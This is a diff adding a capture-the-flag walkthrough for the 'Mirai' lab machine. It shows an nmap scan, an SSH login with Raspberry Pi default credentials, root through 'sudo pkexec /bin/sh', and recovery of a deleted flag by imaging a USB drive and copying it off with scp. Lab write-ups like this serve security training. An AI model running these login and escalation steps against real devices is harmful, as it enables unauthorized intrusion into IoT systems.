@@ -1,0 +1,104 @@
+################################
+Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices.
+This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe,
+and is actively being exploited by a wide variety of botnets.
+Internal IoT devices are also being used for long-term persistence by malicious actors.
+################################
+
+
+1-Enumeration:
+    nmap -T5 -sV -sC -Pn 10.10.10.48 -oN enum/scan1.logs -vv
+        PORT   STATE SERVICE VERSION
+        22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+        | ssh-hostkey:
+
+        |   1024 aaef5ce08e86978247ff4ae5401890c5 (DSA)
+
+        |   2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA)
+
+        |   256 b6a07838d0c810948b44b2eaa017422b (ECDSA)
+
+        |_  256 4d6840f720c4e552807a4438b8a2a752 (ED25519)
+
+        53/tcp open  domain  dnsmasq 2.76
+        | dns-nsid:
+
+        |_  bind.version: dnsmasq-2.76
+
+        80/tcp open  http    lighttpd 1.4.35
+
+        |_http-server-header: lighttpd/1.4.35
+
+        | http-methods:
+
+        |_  Supported Methods: OPTIONS GET HEAD POST
+
+        |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ 
+ 
+    Port 80:   
+        We use dirbuster:
+            http://10.10.10.48/admin:
+                App Name: Pi-hole Version v3.1.4
+                Web Server : lighttpd 1.4.35
+
+                Forgot password:
+                After installing Pi-hole for the first time, a password is generated and displayed to the user. The password cannot be retrieved later on, but it is possible to set a new password (or explicitly disable the password by setting an empty password) using the command
+
+                sudo pihole -a -p
+
+            http://10.10.10.48/versions:
+                upload versions - 1713286211,,,
+                data tables 1.10.12
+
+
+            It is a Raspberry pi version we will use the default passwords:
+                Raspberry
+                Access your account by using the default username “pi” and the default password “raspberry”
+
+ 
+
+    Port 22:
+        We will try to ssh with default creds:
+            ssh pi@10.10.10.48
+
+        Bingo, we have an SSH Shell
+
+ 
+
+
+2-Exploit:
+    Linux Priv Esc:
+        find / -perm -u=s -type f 2>/dev/null
+
+        we found pkexec:
+            sudo pkexec /bin/sh
+
+
+
+    We are Root but the user lost the root flag file:       
+        df -h <-- list of the machine’s partitions
+
+        sudo strings /dev/sdb:
+            display all finds in lost+founds
+
+
+
+    Method 2 - Imaging and Recovery
+
+        The command sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd will create an image of the USB stick
+        and save it to the pi user’s home directory. From there, the file can be exfiltrated many ways. In
+        this case, a simple SCP from the attacking machine will suffice. 
+        
+        The following command copies:
+        usb.dd to the local machine’s working directory: scp pi@10.10.10.48:/home/pi/usb.dd .
+
+        With the USB image at hand, it is possible to run a large range of tools against it to extract the
+        data.
+        
+        Unfortunately, in this case, the data between the filename and the contents of the file itself
+        has been overwritten, so recovery with most tools is not possible. A quick check with testdisk
+        shows the file with a size of 0.
